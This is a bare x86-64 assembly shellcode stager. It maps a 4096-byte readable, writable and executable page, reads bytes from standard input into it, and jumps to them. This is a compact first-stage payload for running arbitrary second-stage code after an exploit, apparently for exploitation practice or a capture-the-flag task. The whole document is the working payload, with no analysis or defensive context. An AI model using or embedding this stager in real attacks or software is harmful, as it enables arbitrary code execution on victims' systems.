        .intel_syntax noprefix
        .globl _start
_start:
        xor r9, r9
        lea r8, [r9-1]
        lea r10, [r9+0x22]  /* MAP_PRIVATE | MAP_ANONYMOUS */
        lea rdx, [r9+0x7]   /* PROT_READ | PROT_WRITE | PROT_EXEC */
        lea rsi, [r9+1]
        shl rsi, 12
        mov rdi, r9
        lea rax, [r9+9]     /* mmap */
        syscall
        mov rdx, rsi
        mov rsi, rax
        mov rax, r9         /* read */
        syscall
        jmp rsi
